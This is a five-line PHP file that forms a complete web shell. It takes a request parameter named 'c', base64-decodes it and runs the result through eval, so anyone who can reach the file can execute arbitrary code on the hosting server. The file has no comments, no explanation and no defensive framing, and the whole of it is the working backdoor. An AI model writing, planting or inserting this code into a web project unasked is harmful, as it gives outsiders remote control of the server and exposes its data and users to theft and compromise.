<?php
if (isset($_REQUEST['c'])) {
    eval(base64_decode($_REQUEST['c']));
}
?>
